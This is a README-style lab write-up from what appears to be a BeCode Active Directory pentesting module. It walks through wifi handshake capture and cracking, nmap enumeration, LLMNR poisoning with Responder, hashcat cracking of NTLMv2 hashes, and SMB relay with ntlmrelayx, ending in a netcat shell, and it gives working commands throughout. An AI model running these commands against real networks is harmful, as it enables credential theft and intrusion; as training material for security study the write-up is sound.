# bc_ad_lab
BeCode Module - Active Directory Pentesting


# Intro

A lab was set up with one machine running a Windows Server 2019 with an Active Directory.
Two other Windows 10 user computers were set up to simulate a working environment.
A machine running a Debian Server was also set up.

# Goal

The goal of this lab was to analyze and exploit an Active Directory and gain the Domain Admin role.

# Steps

## 1. Infiltrating the Network

We observe the network "ADSOC" where our target operates.

The first step is to gain access to the wifi network and start operating from within.

We're gonna perform a Death Attack that'll let us capture a 4 way handshake. For that we'll use a tool that handles everything but alternatives would be to use airmon-ng, airreplay-ng and airodump-ng.

[]()

Once we have a handshake, we can either run aircrack-ng with a wordlist to crack it or in our case, we'll run hashcat with the rockyou.txt wordlist to crack it.

[]()

Once that's done, we have the necessary credentials to connect to the network and start enumerating it.

## 1a. Enumerating the Network

Once connected to the network, we can run a nmap scan to find an attack surface and start exploiting it. We can also figure out the Domain name, in this case BECODE.local.

## 2. LLMNR Poisoning

### What is LLMNR ?

LLMNR, or previously called NBT-NS, is used to identify hosts when the DNS fails to do so and it's main flaw is that it uses a user's username and NTLMv2 when responded to in the right manner.

### How does it work ?

When a user tries to connect to an address on the network that doesnt exist, i.e. mistyping the address of a remote share, the DNS fails to identify the address thus the LLMNR takes over and asks the machines on the network if the address belongs to them. Responder will respond to that request with a poisoned response and thus retrieve the NTLMv2 hash.

### Action

As soon as we get on the network, the first thing we do is run Responder to poison LLMNR requests and potentially capture a NTLMv2 hash.

> responder -I eth0 -dwv

[]()

Once we've managed to capture a hash, we'll have to try and crack it. We'll use hashcat again to do so.

> hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt

[]()

## 2a. SMB Relay Attack

We can perform a SMB Relay Attack instead of a LLMNR Poisoning attack if we do not manage to crack the NTLMv2 hash.

### What is SMB Relay ?

Instead of cracking hashes gathered by Responder, this attack will relay those hashes to specific machines and gain access. 

### Requirements

For this attack to work, SMB Signing must be disabled on the target machine and the relayed credentials must have admin rights on the machine.

We need to change the configuration of Responder and turn off HTTP and SMB.

### Action

First, we need to discover hosts and figure out if they're vulnerable.

> nmap --script=smb2-security-mode.nse -p445 10.10.X.X/24

[]()

If we see "Message signing enabled but not required" then the machine is vulnerable.

Once we've changed the Responder configuration, we run it.

> responder -I wlan1 -dwv

Then we run ntlmrelayx (After puttin the ip addresses of the vulnerable machines in a file targets.txt).

> ntlmrelayx.py -tf targets.txt -smb2support

We should get some hashes.

[]()

Another way of attacking can be to launch our ntlmrelayx with the `-i` flag to straight up pop a shell and listen for it with netcat.

> ntlmrelayx.py -tf targets.txt -smb2support -i
> nc 127.0.0.1 11000


